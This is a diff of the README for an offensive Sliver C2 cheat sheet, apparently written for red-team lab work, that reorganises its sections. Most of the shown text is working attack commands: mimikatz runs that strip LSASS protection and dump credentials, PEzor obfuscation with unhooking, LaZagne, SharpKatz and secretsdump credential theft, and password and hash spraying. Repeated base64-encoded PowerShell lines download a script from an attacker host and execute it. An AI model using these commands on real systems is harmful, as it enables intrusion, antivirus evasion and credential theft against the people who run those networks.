@@ -9,17 +9,20 @@ The C# and PowerShell files throughout the cheat sheet should be publicly access
 
 ## Table of Contents
 
+- [Table of Contents](#table-of-contents)
 - [Q & A](#q--a)
 - [Installation](#installation)
 	- [Server](#server)
 	- [Client](#client)
 	- [Armory packages](#armory-packages)
-- [Listeners](#listeners)
-- [Payloads](#payloads)
-- [Hosts File](#hosts-file)
-- [Nmap Scanning](#nmap-scanning)
-- [Dirsearch](#dirsearch)
-- [Implant Duplication & Migration](#implant-duplication--migration)
+- [Generic Stuff](#generic-stuff)
+	- [Hosts File](#hosts-file)
+	- [Nmap Scanning](#nmap-scanning)
+	- [Dirsearch](#dirsearch)
+- [Initial Foothold](#initial-foothold)
+	- [Listeners](#listeners)
+	- [Payloads](#payloads)
+	- [Implant Duplication & Migration](#implant-duplication--migration)
 - [Bypasses](#bypasses)
 	- [AMSI & CLM](#amsi--clm)
 		- [SharpSh](#sharpsh)
@@ -139,16 +142,16 @@ The C# and PowerShell files throughout the cheat sheet should be publicly access
 
 
 
-
 ## Q & A
 
-- When I run with `-i`, I get CLM runtime error
+- When I run armory packages with `-i`, I get CLM runtime error, how to resolve? 
   - Run the same command again, twice, thrice, it will work out
 
-- Sliver hangs when I run ligolo or other binaries
-  - Press Ctrl + C and then re-run sliver and use the session, it should work fine 
+- Sliver hangs when I run ligolo or other binaries, how to resolve?
+  - Press Ctrl + C and then re-run sliver and use the session being used
+  - Run any commands, it should work fine, ligolo process should keep running within the background
 
-- `SweetPotato` shell dies right after I receive it
+- `SweetPotato` shell dies right after I receive it, how to resolve?
 	- The moment you get the shell either
 		- Run phollow or
 		- Disable AV using the oneliner of sharpsh
@@ -156,11 +159,11 @@ The C# and PowerShell files throughout the cheat sheet should be publicly access
 
 - I can't figure out sliver quote issues
 	- Same lol but with enough practice and time waste, you'll get it
+	- Base64 encode where supported using cyberchef, that should iron out a lot of isses
 
 - Why is there a hav0c-ps.txt file everywhere? 
 	- I got lazy and didn't change the name as I was using Havoc before Sliver
 	- Should be present within https://github.com/Anon-Exploiter/sliver-cheatsheet/blob/main/bins/www/html/hav0c-ps.txt
-
 
 
 ## Installation
@@ -218,7 +221,41 @@ sliver > armory install all
 ```
 
 
-## Listeners
+
+## Generic Stuff
+
+### Hosts File 
+
+Resolves all ips to fqdn within the network based on protocols and adds entry within `/etc/hosts` to not add them manually. 
+
+```powershell
+cd ~/tools/
+git clone https://github.com/eMVee-NL/UpdateHostsFile
+cd UpdateHostsFile
+
+sudo python Update-Hosts-File.py --protocols smb,rdp --subnet 192.168.130.0/24
+sudo python Update-Hosts-File.py --protocols smb,rdp --subnet 172.16.130.0/24
+```
+
+
+### Nmap Scanning
+
+```powershell
+nmap -p- -sC -sV -A -Pn -n --open --append -oN 10.10.200.100 10.10.200.100
+```
+
+
+### Dirsearch
+
+```powershell
+dirsearch -u http://10.10.200.100/ -t 100 --full-url -x 404
+```
+
+
+
+## Initial Foothold
+
+### Listeners
 
 ```powershell
 # Sliver listeners
@@ -240,7 +277,7 @@ http -L 10.10.10.11 --lport 8099
 ```
 
 
-## Payloads
+### Payloads
 
 To be used with files in the `payloads` directory: https://github.com/Anon-Exploiter/sliver-cheatsheet/tree/main/payloads
 
@@ -299,31 +336,8 @@ generate beacon --http 10.10.250.10:8088 --name sliver.obfuscated --os windows -
 ```
 
 
-## Hosts File 
 
-```powershell
-cd ~/tools/UpdateHostsFile
-
-sudo python Update-Hosts-File.py --protocols smb,rdp --subnet 192.168.130.0/24
-sudo python Update-Hosts-File.py --protocols smb,rdp --subnet 172.16.130.0/24
-```
-
-
-## Nmap Scanning
-
-```powershell
-nmap -p- -sC -sV -A -Pn -n --open --append -oN 10.10.200.100 10.10.200.100
-```
-
-
-## Dirsearch
-
-```powershell
-dirsearch -u http://10.10.200.100/ -t 100 --full-url -x 404
-```
-
-
-## Implant Duplication & Migration
+### Implant Duplication & Migration
 
 ```powershell
 # All same, they all launch in x86, regardless of bins, no difference really - -T for same process token
@@ -754,7 +768,7 @@ cd c:/windows/temp/
 ls
 
 
-# Now use PEzor to convert mimikatz into a C# executable with arguments to unload LSA protection by loading mimidrv.sys driver
+# Load the mimidrv driver and remove protection from LSASS
 mimikatz '"privilege::debug" "token::elevate" "!+" "!processprotect /process:lsass.exe /remove"'
 ```
 
@@ -781,6 +795,8 @@ mimikatz '"token::elevate" "vault::cred /patch" "exit"'
 
 #### PEZor - Mimikatz
 
+For converting the mimikatz binary into a C# binary with preloaded arguments and to run with `execute-assembly`
+
 ```powershell
 # Mimikatz
 mimikatz "privilege::debug" "exit"
@@ -801,7 +817,7 @@ ls
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
 
 
-# Looks like this
+# Looks like this - Rinse and repeat for other mimikatz commands
 PEzor -unhook -antidebug -fluctuate=NA -format=dotnet -sleep=5 /home/kali/tools/bins/exes/mimikatz.exe -z 2 -p '"privilege::debug" "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "exit"'
 execute-assembly /home/kali/tools/bins/exes/mimikatz.exe.packed.dotnet.exe
 ```
@@ -811,7 +827,7 @@ execute-assembly /home/kali/tools/bins/exes/mimikatz.exe.packed.dotnet.exe
 ### LaZagne
 
 ```powershell
-# Upload Lazagne binary as its not in C#, defender should be disabled
+# Upload Lazagne binary to execute - as its not in C#, defender should be disabled
 upload /home/kali/tools/bins/exes/LaZagne.exe
 
 
@@ -841,9 +857,10 @@ impacket-secretsdump domain.com/user:'Password123!'@machine -dc-ip 10.10.100.1 -
 nxc smb dc01.domain.com --use-kcache --sam --lsa --dpapi -M ntdsutil
 ```
 
+
 ### SharpKatz
 
-For dumping specific user credentials, need to specify domain name before the user or it won't work.
+For dumping specific user credentials, need to specify domain name before the user or it won't work. Really useful! 
 
 ```powershell
 # LSASS Dump
@@ -865,7 +882,7 @@ execute-assembly /home/kali/tools/bins/csharp-files/SharpKatz.exe --Command dcsy
 
 ### Password Spraying
 
-> Password, Hash and Tickets Spraying
+Password, Hash and Tickets Spraying
 
 ```powershell
 # Domain user creds
@@ -886,7 +903,7 @@ nxc smb 10.10.100.0/24 --use-kcache
 nxc smb machine.domain.com --use-kcache --exec-method atexec -x "powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=="
 
 
-# SSH creds spray
+# SSH creds spray - for domain account
 nxc ssh 10.10.100.0/24 -u user@domain.com -p password
 
 
@@ -999,7 +1016,7 @@ ps -e cmd.exe
 migrate -p 1234
 
 
-# Directly get shell
+# OR Directly get shell
 execute-assembly /home/kali/tools/bins/csharp-files/SharpNamedPipePTH.exe 'username:domain\\user hash:ffffffffffffffffffffffffffffffff binary:"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" arguments:"-nop -w 1 -sta -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQANQAuADEAOQAwAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=="'
 ```
 
@@ -1019,13 +1036,13 @@ make-token -d domain.com -u userooo2 -p 'User123123@'
 
 ### netexec
 
-> Not really related to token stealing/creation but a good option to get shell
+Not really related to token stealing/creation but a good option to get shell when sliver is acting up.
 
 ```powershell
 nxc smb 10.10.100.20 -d . -u Administrator -p 'password' --exec-method atexec -x 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='
 
 
-# Wmi
+# WMI
 nxc wmi 10.10.100.20 --local-auth -u Administrator -p 'password' --rpc-timeout 10
 
 
@@ -1045,7 +1062,7 @@ runas -d . -u Administrator -P 'password' -n -p C:\\windows\\SysWOW64\\notepad.e
 runas -d . -u Administrator -P 'password' -n -p C:\\Windows\\System32\\cmd.exe
 
 
-# 
+# As another user
 runas -d . -u userooo -P 'Password123@' -n -p C:\\Windows\\System32\\cmd.exe
 
 
@@ -1079,11 +1096,11 @@ Sometimes the local user won't work, if that's the case and you have the local a
 runas -d domain.com -u user -P password -n -p "C:\Windows\System32\cmd.exe" -a "/c powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=="
 
 
-# Local User
+# Local Admin
 runas -d . -u Administrator -P 'password'-n -p "C:\Windows\System32\cmd.exe" -a "/c powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=="
 
 
-# 
+# Local User
 runas -d . -u userooo -P 'Password123@' -n -p "C:\Windows\System32\cmd.exe" -a "/c powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4AMQAxAC8AaABhAHYAMABjAC0AcABzAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=="
 ```
 
